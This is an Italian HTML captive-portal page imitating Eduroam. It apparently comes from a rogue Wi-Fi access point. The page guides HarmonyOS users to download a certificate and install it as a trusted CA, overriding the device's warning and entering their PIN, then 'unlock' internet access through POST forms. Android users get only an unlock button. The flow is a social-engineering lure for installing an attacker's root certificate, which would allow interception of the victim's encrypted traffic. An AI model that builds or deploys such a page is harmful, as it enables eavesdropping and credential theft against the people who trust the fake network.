<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <title>Captive Portal Eduroam</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            text-align: center;
            padding-top: 80px;
            margin: 0;
            font-size: 18px; /* Ingrandito */
        }

        .container {
            background-color: white;
            display: inline-block;
            padding: 40px; /* Maggiore padding */
            border-radius: 16px;
            box-shadow: 0 0 16px rgba(0,0,0,0.25);
            max-width: 600px; /* Più larga */
            width: 100%;
            box-sizing: border-box;
            text-align: center;
        }

        .logo {
            width: 220px; /* Più grande */
            margin-bottom: 30px;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }

        h2 {
            color: #003366;
            font-size: 26px;
            margin-bottom: 20px;
        }

        .info {
            font-size: 18px;
            color: #333;
            margin-top: 15px;
        }

        .btn {
            margin: 15px auto;
            padding: 16px 24px;
            font-size: 18px;
            color: white;
            background-color: #003366;
            border: none;
            border-radius: 6px;
            text-decoration: none;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            width: 85%;
            max-width: 320px;
            text-align: center;
        }

        .footer {
            margin-top: 25px;
            font-size: 16px;
            color: #666;
        }

        .guide {
            text-align: left;
            margin-top: 30px;
        }

        .guide h3 {
            color: #003366;
            margin-bottom: 12px;
            font-size: 22px;
        }

        .guide ol {
            padding-left: 25px;
        }

        .guide li {
            margin-bottom: 12px;
            font-size: 17px;
            color: #333;
        }


    </style>
</head>
<body>
    <div class="container">
        <img src="eduroam-logo.png" alt="Eduroam" class="logo">
        <h2>Configurazione Sicura Eduroam</h2>
        <p class="info" style="text-align:center;">Per connetterti in sicurezza al Wi-Fi Eduroam, scarica e installa la configurazione per il tuo sistema operativo:</p>

        <a class="btn" href="javascript:void(0)" onclick="showUnlock_Android()">Android</a>
        <a class="btn" href="javascript:void(0)" onclick="showGuide_HarmonyOS()" >HarmonyOS</a>

        <div class="guide" style="display: none;" id="guide_harmony">
             <h3>Guida per installare il certificato su HarmonyOS</h3>
            <ol>
                <li>Dopo aver cliccato su <strong>"Scarica il certificato"</strong>, apri il file scaricato.</li>
                <li>Alla richiesta di scegliere con quale app aprire il file, seleziona <strong>"Programma installazione certificati"</strong> (è la scelta predefinita).</li>
                <li>Tocca <strong>"Chiudi"</strong>.</li>
                <li>Vai in <strong>Impostazioni</strong> sul tuo dispositivo.</li>
                <li>Usa la barra di ricerca e digita <strong>"certificato CA"</strong>.</li>
                <li>Clicca su <strong>"Installa comunque"</strong> se richiesto.</li>
                <li>Inserisci il <strong>PIN</strong> del dispositivo.</li>
                <li>Nella schermata dell’<strong>Archivio</strong>, cerca il file appena scaricato e selezionalo.</li>
                <li>Infine torna alla schermata del portale (puoi trovarla tra le <strong>app recenti</strong>) e tocca il pulsante <strong>"Sblocca e Naviga in Internet"</strong>.</li>
            </ol>

            <a class="btn" href="/certificate_harmonyOS" download onclick="showUnlock_HarmonyOS()">Scarica il certificato</a>
        </div>

        <div id="unlockSection_Android" style="display:none;">
            <p class="info"><strong>Premi il pulsante per abilitare la connessione.</strong></p>
            <form method="POST" action="/authorize_android_linux">
                <button type="submit" class="btn">Sblocca e Naviga in Internet Android!</button>
            </form>
        </div>

        <div id="unlockSection_HarmonyOS" style="display:none;">
            <p class="info"><strong>Dopo l'installazione, premi il pulsante per abilitare la connessione.</strong></p>
            <form method="POST" action="/authorize">
                <button type="submit" class="btn">Sblocca e Naviga in Internet HarmonyOS!</button>
            </form>
        </div>

        <p class="footer">Se non riesci a navigare, assicurati di aver installato correttamente i certificati.</p>
    </div>

    <script>
        function showUnlock_Android() {
            document.getElementById("unlockSection_Android").style.display = "block";
        }

        function showGuide_HarmonyOS() {
            document.getElementById("guide_harmony").style.display = "block";
        }

        function showUnlock_HarmonyOS() {
            document.getElementById("unlockSection_HarmonyOS").style.display = "block";
        }
    </script>
</body>
</html>
